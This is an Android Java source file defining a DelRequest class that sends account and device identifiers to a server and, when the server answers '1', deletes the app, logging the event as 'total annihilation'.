package com.inet.android.request;

import java.io.UnsupportedEncodingException;
import java.util.concurrent.TimeUnit;

import org.apache.http.Header;
import org.apache.http.message.BasicHeader;
import org.json.JSONException;
import org.json.JSONObject;

import android.content.Context;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.preference.PreferenceManager;

import com.inet.android.bs.ServiceControl;
import com.inet.android.utils.Logging;
import com.loopj.android.http.RequestParams;

/**
 * DelRequest class is designed to stop the program
 * 
 * @author johny homicide
 * 
 */
public class DelRequest extends DefaultRequest {
	private final String LOG_TAG = DelRequest.class.getSimpleName().toString();
	private Context mContext;
	private SharedPreferences sp;
	private Editor ed;

	public DelRequest(Context ctx) {
		super(ctx);
		this.mContext = ctx;
		sp = PreferenceManager.getDefaultSharedPreferences(ctx);
		ed = sp.edit();
	}

	@Override
	public void sendRequest() {
		final Header[] headers = {
				new BasicHeader("Accept", "application/json"),
				new BasicHeader("Authorization", "Bearer "
						+ sp.getString("access_first_token", "")) };
		Logging.doLog(
				LOG_TAG,
				"send start request, account: "
						+ sp.getString("account", "account"));
		RequestParams params = new RequestParams();
		params.put("account", sp.getString("account", "0000"));
		params.put("device", sp.getString("device", "0000"));
		params.put("key", sp.getString("key_removal", "-1"));
		params.put("mode", "1");

		final Caller caller = Caller.getInstance();
		caller.makeRequest(mContext, AppConstants.DEL_LINK, headers, params,
				new RequestListener() {

					@Override
					public void onSuccess(int arg0, Header[] arg1,
							JSONObject timeline) {
						// TODO Auto-generated method stub

					}

					@Override
					public void onFailure(int arg0, byte[] errorResponse) {
						// TODO Auto-generated method stub
						if (arg0 == 401) {
							caller.sendRequestForFirstToken(mContext);
							try {
								// TimeUnit.SECONDS.sleep(1);
								TimeUnit.MILLISECONDS.sleep(1000);
							} catch (InterruptedException e) {
								e.printStackTrace();
							}
							sendRequest();
						}
					}

					@Override
					public void onSuccess(int arg0, Header[] arg1,
							byte[] response) {
						try {
							getRequestData(response);
						} catch (UnsupportedEncodingException e) {
							// TODO Auto-generated catch block
							e.printStackTrace();
						}
					}
				});

	}

	

	@Override
	protected void getRequestData(byte[] response) throws UnsupportedEncodingException {
		Parser parser = new Parser(mContext);
		String[] del = null;
		try {
			del = parser.parsing(response);
		} catch (UnsupportedEncodingException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (JSONException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		if (del[0] != null) {
			ed.putString("code_del", del[0]);
			if (del[0].equals("1")) {
				Logging.doLog(LOG_TAG, "total annihilation",
						"total annihilation");
				ServiceControl.deleteApp(mContext);
			} else if (del[0].equals("0"))
				DisassemblyErrors.setError(del[1], mContext);

			ed.commit();
		}
	}

}
